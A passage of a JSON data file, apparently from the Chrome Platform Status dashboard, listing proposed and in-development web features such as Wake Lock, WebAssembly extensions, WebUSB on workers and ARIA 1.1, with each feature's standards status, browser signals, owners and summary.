          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Some APIs are restricted by the notion of User Activation (https://html.spec.whatwg.org/multipage/interaction.html#activation). eg. requestFullScreen, autoplay, window.open\r\n\r\nUsing this restriction is powerful in preventing annoying behavior  that some javascript can take without it. However an application may wish to use this information inside the application itself and it has no way to do that today. This proposal is to add ability to query the User Agent state.\r\n\r\n",
    "id": 5131233151418368,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:16.927180",
      "by": "ericbidelman@google.com"
    },
    "name": "UserAgent Stylesheets for Extensions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-cascade-3/#cascading",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "nainar@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "http://crbug.com/632009",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Provide extensions with a way to inject styles into a page that take precedence over the page's styles. Do so by implementing user stylesheet level priority, which is lower than author specified rules, but higher for !important rules.\r\n",
    "id": 6645142303801344,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1e9qAYq1tc1mqHStIGIaafPN9_qiDFjBaG71UiO49PPA/edit#heading=h.toag8p11t8x5"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-04-25 16:36:52.117990",
      "by": "jmedley@google.com"
    },
    "name": "Wake Lock API based on Promises",
    "tags": [
      "Wake Lock",
      "WakeLock"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/wake-lock/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/requestWakeLock",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mrunal.kapade@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WakeLock"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=257511",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Wake Lock API brings a standard, secure, and safe way to prevent some device features such as the screen or CPU cycles going into power saving state. In this latest iteration of API we aim to address some of the shortcomings of the older api which was limited to screen Wake Lock and didn’t address some of the security and privacy issues. This 2nd iteration of Wake lock API makes use of Promises and introduces Wake Lock Types.",
    "id": 4636879949398016,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:02.376400",
      "by": "ericbidelman@google.com"
    },
    "name": "Web notifications inline replies",
    "tags": [
      "notifications",
      "inline",
      "replies"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "nsatragno@chromium.org",
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://github.com/whatwg/notifications/issues/68",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support adding a text reply to web notification actions.",
    "id": 5743740178137088,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1lN_2cmD1yZg80vGMs4K5JwrlfeALdR-4doODAKV16Hc/edit#heading=h.tav5v5bzofgf"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:32:06.827080",
      "by": "jmedley@google.com"
    },
    "name": "WebAssembly BigInt Integration",
    "tags": [
      "wasm",
      "webassembly",
      "bigint",
      "i64"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/WebAssembly/JS-BigInt-integration",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "gdeepti@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7741",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow WebAssembly to import and export WebAssembly function parameters of type i64 using BigInt.\r\n",
    "id": 5648655109324800,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 16:59:15.927820",
      "by": "bradnelson@google.com"
    },
    "name": "WebAssembly Content Security Policy",
    "tags": [
      "wasm",
      "webassembly",
      "csp"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "eholk@chromium.org",
          "hablich@chromium.org",
          "kschimpf@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=841405",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Enhancements to Content Security Policy to improve interoperability with WebAssembly.\r\n",
    "id": 5499765773041664,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/content-security-policy/blob/master/proposals/CSP.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 20:03:23.048130",
      "by": "bradnelson@google.com"
    },
    "name": "WebAssembly Host Bindings",
    "tags": [
      "wasm",
      "webassembly",
      "webgl",
      "host bindings"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/WebAssembly/host-bindings/blob/master/proposals/host-bindings/Overview.md",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "bradnelson@chromium.org",
          "titzer@chromium.org",
          "nattestad@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=841496",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow WebAssembly modules to invoke, construct, and efficiently marshal to JavaScript + DOM APIs.\r\nThis feature in tandem with reference types is intended to make API calls (for example to WebGL) fast.\r\n",
    "id": 6219189974990848,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/host-bindings/blob/master/proposals/host-bindings/Overview.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 16:52:42.408010",
      "by": "bradnelson@google.com"
    },
    "name": "WebAssembly Managed Objects / GC",
    "tags": [
      "wasm",
      "webassembly",
      "gc",
      "managed objects"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 1
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "titzer@chromium.org",
          "ahaas@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7748",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3481",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds to WebAssembly the ability to manipulate structured data containing references.\r\nThis will allow WebAssembly to implement garbage collected languages efficiently.\r\n",
    "id": 6062715726462976,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/gc/blob/master/proposals/gc/Overview.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:32:37.310120",
      "by": "jmedley@google.com"
    },
    "name": "WebAssembly Type Reflection JS API",
    "tags": [
      "wasm",
      "webassembly",
      "reflection"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/WebAssembly/js-types",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "kschimpf@chromium.org",
          "titzer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7742",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Expands the JavaScript API surface of WebAssembly to allow reflection on the data types of functions imported and exported from a WebAssembly module.\r\n",
    "id": 5725002447978496,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/js-types/blob/master/proposals/js-types/Overview.md"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:59.625590",
      "by": "ericbidelman@google.com"
    },
    "name": "WebRTC Frame Event Logging API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://alvestrand.github.io/webrtc-framelog/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "sergeyu@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>Video"
        ],
        "flag": false,
        "bug": "http://crbug.com/725312",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "WebRTC Frame Event Logging API will allow an application to record timestamps when each frame is processed by different parts of the processing pipeline. Each frame is uniquely identified, which allows to correlate values received for each frame on both ends of the connection and then measure total end-to-end latency for each individual frame. This is required in many contexts for measuring things like click-to-effect performance, camera-to-screen lag and so on.",
    "id": 5725395324239872,
    "resources": {
      "docs": [
        "https://alvestrand.github.io/webrtc-framelog/",
        "https://github.com/alvestrand/webrtc-framelog/blob/gh-pages/explainer.md"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-06-28 18:39:26.639015",
      "by": "odejesush@chromium.org"
    },
    "name": "WebUSB on Dedicated Workers",
    "tags": [
      "WebUSB",
      "Worker",
      "Web Worker",
      "Dedicated Worker"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://wicg.github.io/webusb/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/58",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "odejesush@chromium.org",
          "reillyg@chromium.org",
          "chongz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>USB"
        ],
        "flag": false,
        "bug": "https://crbug.com/837406",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/16268590-support-webusb-api",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-webusb",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enable the WebUSB API to work inside Dedicated Worker contexts.",
    "id": 5928209916887040,
    "resources": {
      "docs": [
        "https://github.com/odejesush/webusb-on-workers/blob/master/EXPLAINER.md",
        "https://docs.google.com/document/d/16T3rhUtYg3GBGotj_pPUXmGmYbf15qdYNEYf4LhKAhM/"
      ],
      "samples": [
        "https://github.com/odejesush/weblight/tree/dedicated-worker"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-04-17 23:07:40.229070",
      "by": "ddorwin@chromium.org"
    },
    "name": "WebXR Anchors",
    "tags": [
      "AR",
      "XR"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/immersive-web/proposals/issues/10#issuecomment-372798219",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "ijamardo@chromium.org",
          "johnpallett@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebVR"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=833646",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This API is an extension to the WebXR Device API that provides a way to indicate to the underlying pose tracking system that some arbitrary 3D poses (positions and orientations) are meant to be kept up to date. Especially with current AR tracking technology, poses evolve over time as the system understands more of the real world that surrounds it. As the system tracking evolves, virtual object poses should also be automatically updated so they keep their real world pose integrity/relationship.",
    "id": 5129925015109632,
    "resources": {
      "docs": [
        "https://github.com/immersive-web/anchors/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-05-23 14:36:14.537960",
      "by": "jmedley@google.com"
    },
    "name": "deprecate and remove HTMLFrameSetElement's anonymous getter.",
    "comments": "This non-standard getter was added 13 years ago to fix a compatibility issue at the time: https://trac.webkit.org/changeset/8717/webkit\r\nbut it is not non-standard and nowadays it seems not used.\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/#htmlframesetelement",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "hs1217.lee@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=695891",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Deprecate and remove HTMLFrameSetElement's anonymous getter which is non-standard.",
    "id": 5235521668251648,
    "resources": {
      "samples": [
        "https://software.hixie.ch/utilities/js/live-dom-viewer/saved/4928"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-09-17 08:17:10.925940",
      "by": "Patket@microsoft.com"
    },
    "name": "install event for Web App Manifest",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/manifest/#installation-events",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/Window/oninstall",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mgiuca@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/621393",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "An event handler to tell a site that it has been installed or added to home screen.",
    "id": 5674968658477056,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/oninstall"
      ],
      "samples": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/oninstall"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-05 21:57:41.664720",
      "by": "ericbidelman@google.com"
    },
    "name": "inverted-colors media query",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/mediaqueries-4/#inverted",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "dmazzoni@chromium.org",
          "aboxhall@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Accessibility"
        ],
        "flag": false,
        "bug": "http://crbug.com/571154",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/browser/trunk/LayoutTests/fast/media/mq-inverted-colors.html?order=name",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "An indication that the user agent or underlying operating system has forcibly inverted all colors, not a request to do so. This is sometimes provided as a simple accessibility feature, allowing users to switch between light-on-dark and dark-on-light text.",
    "id": 5940010603773952,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:00.219770",
      "by": "ericbidelman@google.com"
    },
    "name": "user-select:contain",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/css-ui-4/#propdef-user-select",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "yoichio@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=658129",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/windows/apps/hh779846.aspx?f=255&MSPPError=-2147217396",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This user-select:contain value allows authors to specify which elements in the document can enclose user selection.",
    "id": 5730263904550912,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-24 05:23:51.748900",
      "by": "fergal@chromium.org"
    },
    "first_of_milestone": true,
    "name": "::part and ::theme pseudo elements on shadow hosts",
    "tags": [
      "part theme css shadow"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://drafts.csswg.org/css-shadow-parts/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "fergal@chromium.org",
          "jackalmage@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://crbug.com/805271",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This specification defines the ::part() and ::theme() pseudo-elements on shadow hosts, allowing shadow hosts to selectively expose chosen elements from their shadow tree to the outside page for styling purposes.",
    "id": 5763933658939392,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-08-07 20:18:17.016770",
      "by": "ericbidelman@google.com"
    },
    "name": "<dialog>: add DialogShowParams to show()/showModal()",
    "tags": [
      "dialog",
      "focus",
      "inert"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/whatwg/html/pull/2197",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/html/pull/2197",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dbeam@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WindowDialog"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=677562",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds parameters to change how show() or showModal() is called.",
    "id": 5121613552943104,
    "resources": {
      "docs": [
        "https://www.w3.org/Bugs/Public/show_bug.cgi?id=24718",
        "https://github.com/whatwg/html/issues/1929"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-08-07 04:11:01.024400",
      "by": "ericbidelman@google.com"
    },
    "name": "ARIA 1.1",
    "tags": [
      "a11y"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://rawgit.com/w3c/aria/master/aria/aria.html",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1177910",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dmazzoni@chromium.org",
          "aboxhall@chromium.org",
          "nektar@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Accessibility"
        ],
        "flag": false,
        "bug": "https://crbug.com/644766",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/accessiblerichinternetapplicationswaiaria11/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=148967",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Implement the changes in version 1.1 of the Accessible Rich Internet Applications (WAI-ARIA) 1.1 spec.",
    "id": 5761503818940416,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-04 09:48:23.583140",
      "by": "myakura.web@gmail.com"
    },
    "name": "Accessible Object Model (AOM)",
    "tags": [
      "accessibility aom a11y-api"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/aom/spec/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dmazzoni@chromium.org",
          "aboxhall@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Accessibility"
        ],
        "flag": false,
        "bug": "https://crbug.com/680345",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=179255",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This effort aims to create a JavaScript API to allow developers to modify (and eventually explore) the accessibility tree for an HTML page.",
    "id": 6643371200217088,
    "resources": {
      "docs": [
        "https://github.com/WICG/aom/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-10-12 15:51:27.221560",
      "by": "ericbidelman@google.com"
    },
    "name": "Add and update MHTML headers to support sharing of MHTML pages",
    "tags": [
      "MHTML"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "jianli@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SavePage"
        ],
        "flag": false,
        "intervention": false
      },
